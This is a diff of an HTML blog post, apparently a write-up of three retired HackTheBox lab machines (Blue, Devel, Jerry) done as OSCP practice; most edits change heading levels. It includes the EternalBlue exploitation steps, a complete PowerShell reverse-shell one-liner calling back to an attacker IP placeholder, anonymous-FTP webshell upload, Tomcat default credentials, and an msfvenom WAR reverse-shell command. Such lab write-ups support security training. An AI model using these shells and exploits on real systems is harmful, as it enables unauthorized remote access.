@@ -20,9 +20,10 @@
 <p>Instead of a single box write-up, I am including walkthroughs for three <em>easy</em> rated, retired Windows HackTheBox machines here to kick off my pursuit of completing the infamous TJNull list of OSCP prep-relevant machines across the popular CTF and training platforms. The <a href="https://twitter.com/TJ_Null/status/1580174678555230209">recently updated</a> list can be found <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?usp=sharing">here</a>. Due to the simplicity of the machines, these writeups presented with concision in mind, unlike the majority of my other walkthroughs.
 <br/><br/>
 <strong>Note:</strong> I have replaced all instances of the virtual machines&rsquo; ip addresses with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
-<h3 id="blue">Blue</h3>
+<h2 id="blue">Blue</h2>
 <p>Rooting this box involves the discovery and exploitation of the EternalBlue SMBv1 vulnerability. For more information on EternalBlue, see <a href="https://www.avast.com/c-eternalblue">this explanation on Avast.com</a>. In this write-up, I present methods for exploitation using, and not using, Metasploit.</p>
-<h4 id="enumeration">Enumeration</h4>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="nmap">nmap</h4>
 <p>Enumeration is accomplished quickly and easily with nmap. After finding the machine&rsquo;s SMB service active and listening on ports 135/445, we can use nmap&rsquo;s <code>smb-vuln-ms17-010</code> script to identify the vulnerability. For more information on the script, <a href="https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html">click here</a>.</p>
 <pre tabindex="0"><code>| smb-vuln-ms17-010: 
 |   VULNERABLE:
@@ -32,8 +33,8 @@
 |     Risk factor: HIGH
 |       A critical remote code execution vulnerability exists in Microsoft SMBv1
 |        servers (ms17-010).
-</code></pre><h4 id="exploitation">Exploitation</h4>
-<h5 id="with-metasploit">With Metasploit</h5>
+</code></pre><h3 id="exploitation">Exploitation</h3>
+<h4 id="with-metasploit">With Metasploit</h4>
 <p>To conduct the exploitation of EternalBlue with Metasploit, we use the <code>windows/smb/ms17_010_eternalblue</code> module. After setting the necessary options, we run the exploit in <code>check</code> mode and look for sucess messages to confirm that the exploit was effective. If not, we will have somewhere to start when working to fix any problems.</p>
 <pre tabindex="0"><code>[*] &lt;target-ip&gt;:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
 [+] &lt;target-ip&gt;:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
@@ -47,7 +48,7 @@
 </code></pre><p>We are then left with a meterpreter shell session as <code>NT Authority\SYSTEM</code>:</p>
 <pre tabindex="0"><code>meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
-</code></pre><h5 id="without-metasploit">Without Metasploit</h5>
+</code></pre><h4 id="without-metasploit">Without Metasploit</h4>
 <p>To effect this exploit without the use of Metasploit, we instead use <code>searchsploit</code> to look through the ExploitDB database for relevant exploits. Luckily, there are a plethora of options to choose from:</p>
 <pre tabindex="0"><code>---------------------------------------------------------- ---------------------------------
  Exploit Title                                             |  Path
@@ -83,10 +84,10 @@ creating file c:\pwned.txt on the target
 <pre tabindex="0"><code>smb_send_file(smbConn, &#39;NotAnExploit.exe&#39;, &#39;C&#39;, &#39;/NotAnExploit.exe&#39;)
 service_exec(conn, r&#39;cmd /c C:\NotAnExploit.exe&#39;)
 </code></pre><p>With this completed, we should get a reverse shell back when running the exploit!</p>
-<h3 id="devel">Devel</h3>
+<h2 id="devel">Devel</h2>
 <p>Completing this box involves FTP and web server exploitation, paired with a flexible privilege escalation portion, which allows for a variety of vectors to be utilized. As this machine is old (2050 days older at the time of publication!) and I need practice with kernel exploits, I&rsquo;ve chosen this route.</p>
-<h4 id="enumeration-1">Enumeration</h4>
-<h5 id="nmap">nmap</h5>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="nmap-1">nmap</h4>
 <pre tabindex="0"><code>21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
 | ftp-syst: 
 |_  SYST: Windows_NT
@@ -104,17 +105,17 @@ service_exec(conn, r&#39;cmd /c C:\NotAnExploit.exe&#39;)
 
 Identified HTTP Server: Microsoft-IIS/7.5
 </code></pre><p>Our scans return two basic services with ports open: FTP on port 21 and an IIS webserver on port 80.</p>
-<h5 id="ftp">FTP</h5>
+<h4 id="ftp">FTP</h4>
 <p>While the webserer only appears to contain default content, we discover that we can log in to the FTP server anonymously with <code>ftp anonymous@10.10.10.5</code>. Not only that, but we find that we have permission to upload files to the server with the <code>put</code> command. After conducting a few tests with generic image and HTTP files, we discover that the uploaded content can be accessed via the webserver on port 80.</p>
 <p>Thus, we upload an Active Server Pages (<code>.aspx</code> - a format designed for .NET) webshell to the server. By passing commands through the relevant parameter in our requests, we discover that we have command execution on the machine as the <code>iis apppool\web</code> user. We also determine the following about the system:</p>
 <pre tabindex="0"><code>Host Name:                 DEVEL
 OS Name:                   Microsoft Windows 7 Enterprise
 OS Version:                6.1.7600 N/A Build 7600
 System Type:               X86-based PC
-</code></pre><h5 id="foothold---reverse-shell">Foothold - Reverse Shell</h5>
+</code></pre><h3 id="foothold---reverse-shell">Foothold - Reverse Shell</h3>
 <p>In addition to enumerating our current user with <code>whoami</code>, we are able to use the <code>ping</code> command to verify that our attacking machine is reachable from the server. While we could transfer a netcat binary to the machine to generate a callback, this is an older machine and, thus, it may be easier to connect via PowerShell. With a bit of experimentation, we manage to do just that with the following shellcode:</p>
 <pre tabindex="0"><code>powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;attacker-ip&gt;&#39;,8889);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;
-</code></pre><h4 id="privilege-escalation">Privilege Escalation</h4>
+</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
 <p>From our PowerShell, we can do a bit more manual enumeration:
 <code>whoami /priv</code></p>
 <pre tabindex="0"><code>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
@@ -194,10 +195,10 @@ MS11-046.exe
 c:\Windows\System32&gt;whoami
 whoami
 nt authority\system
-</code></pre><h3 id="jerry">Jerry</h3>
+</code></pre><h2 id="jerry">Jerry</h2>
 <p>The third box of our initial roundup, Jerry features basic exploitation of an Apache Tomcat web server.</p>
-<h4 id="enumeration-2">Enumeration</h4>
-<h5 id="nmap-1">nmap</h5>
+<h3 id="enumeration-2">Enumeration</h3>
+<h4 id="nmap-2">nmap</h4>
 <pre tabindex="0"><code>8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
 | http-methods: 
 |_  Supported Methods: GET HEAD POST OPTIONS
@@ -209,7 +210,7 @@ nt authority\system
 <p><code>&lt;target-ip&gt;:8080</code></p>
 <pre tabindex="0"><code>Apache Tomcat/7.0.88
 If you&#39;re seeing this, you&#39;ve successfully installed Tomcat. Congratulations!
-</code></pre><h5 id="nikto">nikto</h5>
+</code></pre><h4 id="nikto">nikto</h4>
 <p>Despite its age, nikto can still often yield valuable information about web applications. Here, we get <em>very</em> lucky, with the following output:</p>
 <pre tabindex="0"><code>+ Default account found for &#39;Tomcat Manager Application&#39; at /manager/html (ID &#39;tomcat&#39;, PW &#39;s3cret&#39;). Apache Tomcat.
 </code></pre><p>Browsing to <code>&lt;target-ip&gt;:8080/manager</code> confirms this.</p>
@@ -218,7 +219,7 @@ If you&#39;re seeing this, you&#39;ve successfully installed Tomcat. Congratulat
 Username:
 
 Password:
-</code></pre><h5 id="rce---administration-panel">RCE - Administration Panel</h5>
+</code></pre><h3 id="rce---administration-panel">RCE - Administration Panel</h3>
 <p>Apache Tomcat is a common platform for deploying Java code. This means that we can use a malicious Web Application Resource (alternatively known as a Web Application Archive - <code>.war</code>) file to create a reverse shell callback to our machine.</p>
 <p>First, we generate the necessary payload with msfvenom:</p>
 <p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war</code></p>
